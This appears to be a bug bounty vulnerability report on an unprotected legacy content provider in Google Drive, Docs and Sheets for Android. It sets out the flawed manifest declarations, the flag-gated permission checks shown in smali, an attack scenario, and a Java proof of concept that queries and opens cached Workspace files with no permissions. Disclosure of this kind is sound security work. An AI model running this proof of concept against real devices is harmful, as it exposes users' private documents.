# VRP Report #35: Google Workspace LegacyStorageBackendContentProvider — Zero-Permission Data Access Across Drive, Docs, and Sheets

## Summary

The shared Google Workspace library class `LegacyStorageBackendContentProvider` is exported with **no manifest-level permission requirement** in **three separate Google apps** — Google Drive, Google Docs, and Google Sheets. Its `query()` method contains **zero permission checks** — any app can query file metadata (filenames, document IDs, sizes, MIME types, timestamps) without any permissions. Additionally, `openFile()`, `openTypedAssetFile()`, and `call()` have permission checks that are **conditionally gated behind Phenotype feature flag 45793750**, which defaults to `false`. When the flag is at its default, any zero-permission app can read the actual contents of cached Workspace files on the device.

Google Slides (also installed) likely has the same vulnerability as it uses the same shared library, but was not available for static analysis.

## Affected Components

| App | Package | Authority |
|-----|---------|-----------|
| Google Drive | `com.google.android.apps.docs` | `com.google.android.apps.docs.storage.legacy` |
| Google Docs | `com.google.android.apps.docs.editors.docs` | `com.google.android.apps.docs.editors.kix.storage.legacy` |
| Google Sheets | `com.google.android.apps.docs.editors.trix` | `com.google.android.apps.docs.editors.trix.storage.legacy` |
| Google Slides (likely) | `com.google.android.apps.docs.editors.slides` | `com.google.android.apps.docs.editors.slides.storage.legacy` (unconfirmed) |

- **Shared Class**: `com.google.android.apps.docs.common.storagebackend.LegacyStorageBackendContentProvider`
- **Device**: Pixel 6a, Android 17 (API 37), Build CP2A.260605.012

## Vulnerability Details

### 1. Manifest Declaration — No Permission

The non-legacy `StorageBackendContentProvider` in Drive is properly protected:
```xml
<provider android:authorities="com.google.android.apps.docs.storage"
          android:exported="true"
          android:grantUriPermissions="true"
          android:permission="android.permission.MANAGE_DOCUMENTS">
```

The legacy providers across all three apps have **no protection**:

**Google Drive:**
```xml
<provider android:authorities="com.google.android.apps.docs.storage.legacy"
          android:exported="true"
          android:name="com.google.android.apps.docs.common.storagebackend.LegacyStorageBackendContentProvider"/>
```

**Google Docs:**
```xml
<provider android:authorities="com.google.android.apps.docs.editors.kix.storage.legacy"
          android:exported="true"
          android:name="com.google.android.apps.docs.common.storagebackend.LegacyStorageBackendContentProvider"/>
```

**Google Sheets:**
```xml
<provider android:authorities="com.google.android.apps.docs.editors.trix.storage.legacy"
          android:exported="true"
          android:name="com.google.android.apps.docs.common.storagebackend.LegacyStorageBackendContentProvider"/>
```

No `android:permission`, no `android:readPermission`, no `android:writePermission`, no `grantUriPermissions` on any of them.

### 2. query() — Zero Permission Checks

The `query()` method (smali line 1929) performs **no permission checks whatsoever**:
- No `checkCallingUriPermission()`
- No `checkCallingPermission()`
- No feature flag gating
- No UID/signature verification

It directly matches the URI, resolves the document, and returns a Cursor with columns:
- `_id` — internal ID
- `document_id` — Drive document identifier
- `_display_name` — filename
- `mime_type` — file type
- `_size` — file size in bytes
- `last_modified` — timestamp
- `flags` — document flags
- `icon` — icon reference

### 3. openFile() — Feature-Flag-Gated Permission Check (Default: OFF)

The `openFile()` method (smali line 667) checks Phenotype flag before enforcing permissions:

```
# smali line 696-728:
sget-object v2, Laaci;->a:Laaci;           # Get flag holder
iget-object v2, v2, Laaci;->b:Lwyx;        # Get lazy wrapper
check-cast v2, Lwzb;
iget-object v2, v2, Lwzb;->a:Ljava/lang/Object;
check-cast v2, Laacj;
invoke-interface {v2}, Laacj;->a()Z         # Check flag
move-result v2
if-eqz v2, :cond_3                         # If FALSE → SKIP permission check!

# Permission check block (ONLY runs when flag=true):
invoke-virtual {v4, v0, v2}, Landroid/content/Context;->checkCallingUriPermission(...)I
if-nez v2, :cond_2                          # If denied → SecurityException
goto :goto_0                                # If granted → proceed

:cond_3                                     # Flag=false → directly here, NO check
:goto_0                                     # Both paths converge
# ... proceeds to serve the file
```

### 4. Feature Flag Details

- **Phenotype namespace**: `com.google.apps.drive.android.library.device`
- **Flag ID**: `45793750`
- **Default value**: `false` (smali: `const/4 v4, 0x0`)

In Drive, the flag interface is obfuscated as `aacj`/`aack`. In Sheets, it is preserved as `googledata.experiments.mobile.drive.android.library.device.features.z` (the same interface, unobfuscated). Both confirm the same behavior: when the flag is at its default value (`false`), the permission check is completely bypassed.

### 5. Same Pattern in openTypedAssetFile() and call()

The same flag-gated permission bypass exists in:
- `openTypedAssetFile()`: Same flag check, skip to file serving when false
- `call()`: Same flag check, skip to handling when false

### 6. Same Shared Code Across Three Apps

All three apps (Drive, Docs, Sheets) use the identical `LegacyStorageBackendContentProvider` class from the shared Google Workspace library. The smali code is structurally identical — same feature flag interface, same conditional branch pattern. Sheets preserves the unobfuscated interface name `googledata.experiments.mobile.drive.android.library.device.features.z`, confirming the flag namespace.

## Impact

### With Feature Flag at Default (false) — CRITICAL
- **Confidentiality**: Any zero-permission app can read the **contents** of all locally-cached Google Workspace files via `openFile()` and `openTypedAssetFile()` across all three apps
- This includes Drive files, Google Docs documents, Google Sheets spreadsheets, and any other files cached by these apps
- No user interaction required after app installation
- **Scope multiplier**: A single exploit app can query three separate content authorities simultaneously, accessing data from Drive, Docs, and Sheets in one sweep

### Regardless of Feature Flag — HIGH
- **Confidentiality**: Any zero-permission app can enumerate Workspace file metadata via `query()` from all three providers:
  - Filenames (`_display_name`)
  - Document IDs (`document_id`)
  - File sizes (`_size`)
  - MIME types (`mime_type`)
  - Last modified timestamps (`last_modified`)
- Document IDs obtained from `query()` can be used to construct URIs for `openFile()` attacks
- Metadata alone reveals sensitive information: document names, file types, and activity timestamps across a user's entire Workspace

### Attack Scenario
1. Victim installs a benign-looking app (game, utility) requesting **zero permissions**
2. App queries all three authorities simultaneously:
   - `content://com.google.android.apps.docs.storage.legacy/*` (Drive)
   - `content://com.google.android.apps.docs.editors.kix.storage.legacy/*` (Docs)
   - `content://com.google.android.apps.docs.editors.trix.storage.legacy/*` (Sheets)
3. Metadata enumeration reveals all cached document names, types, sizes
4. If Phenotype flag 45793750 is at default (false): App reads full file contents from all three apps
5. Stolen data exfiltrated to attacker's server

## Root Cause

The `LegacyStorageBackendContentProvider` was created as a backward-compatible version of `StorageBackendContentProvider` but was not given the same `android:permission="android.permission.MANAGE_DOCUMENTS"` manifest declaration. The code-level `checkCallingUriPermission()` was added behind a Phenotype feature flag (45793750) that defaults to `false`, meaning the permission enforcement is opt-in rather than opt-out — a dangerous security pattern where a new security check is gated behind a flag that must be explicitly enabled.

## Proof of Concept

```java
// Zero-permission app — no dangerous permissions needed
ContentResolver cr = getContentResolver();

// All three vulnerable authorities
String[] AUTHORITIES = {
    "com.google.android.apps.docs.storage.legacy",           // Drive
    "com.google.android.apps.docs.editors.kix.storage.legacy", // Docs
    "com.google.android.apps.docs.editors.trix.storage.legacy" // Sheets
};

for (String authority : AUTHORITIES) {
    // TEST 1: Query metadata (ALWAYS works, no flag needed)
    Uri uri = Uri.parse("content://" + authority + "/<document_id>");
    Cursor c = cr.query(uri, new String[]{
        "_id", "document_id", "_display_name", "mime_type", "_size", "last_modified"
    }, null, null, null);
    // Returns file metadata without any permission check

    // TEST 2: Read file contents (works when flag 45793750 = false)
    InputStream is = cr.openInputStream(uri);
    // Returns file content stream — no SecurityException when flag is off
}
```

## Remediation

1. **Immediate**: Add `android:permission="android.permission.MANAGE_DOCUMENTS"` to the `LegacyStorageBackendContentProvider` manifest declaration in **all apps** (Drive, Docs, Sheets, and Slides), matching the non-legacy provider in Drive
2. **Defense in depth**: Remove the feature flag gating on the `checkCallingUriPermission()` calls — make the permission check unconditional
3. **Additional**: Add `checkCallingUriPermission()` to the `query()` method, which currently has no permission check at all
4. **Library fix**: Since this is shared library code, fix the `LegacyStorageBackendContentProvider` class itself so all consuming apps inherit the fix

## CVSS

- **Score**: 7.5 (High) / 9.1 (Critical if flag is at default)
- **Vector**: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (query only)
- **Vector**: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (with openFile when flag=false)
- **Scope**: Three confirmed apps, likely four (Slides unconfirmed)

## Files Analyzed

### Google Drive
- `google_apks/drive/decoded/AndroidManifest.xml` — manifest declaration (authority: `com.google.android.apps.docs.storage.legacy`)
- `google_apks/drive/decoded/smali/com/google/android/apps/docs/common/storagebackend/LegacyStorageBackendContentProvider.smali` — full provider code
- `google_apks/drive/decoded/smali/jwk.smali` — query column definitions
- `google_apks/drive/decoded/smali_classes3/aack.smali` — feature flag implementation (default=false)
- `google_apks/drive/decoded/smali_classes3/aaci.smali` — flag holder (Dagger injection)
- `google_apks/drive/decoded/smali_classes3/aaba.smali` — Phenotype namespace (`com.google.apps.drive.android.library.device`)

### Google Docs
- `google_apks/docs_editor/decoded/AndroidManifest.xml` — manifest declaration (authority: `com.google.android.apps.docs.editors.kix.storage.legacy`)
- Same `LegacyStorageBackendContentProvider` shared class

### Google Sheets
- `google_apks/sheets/decoded/AndroidManifest.xml` — manifest declaration (authority: `com.google.android.apps.docs.editors.trix.storage.legacy`)
- `google_apks/sheets/decoded_full/smali/com/google/android/apps/docs/common/storagebackend/LegacyStorageBackendContentProvider.smali` — confirms identical code with unobfuscated flag interface `googledata.experiments.mobile.drive.android.library.device.features.z`
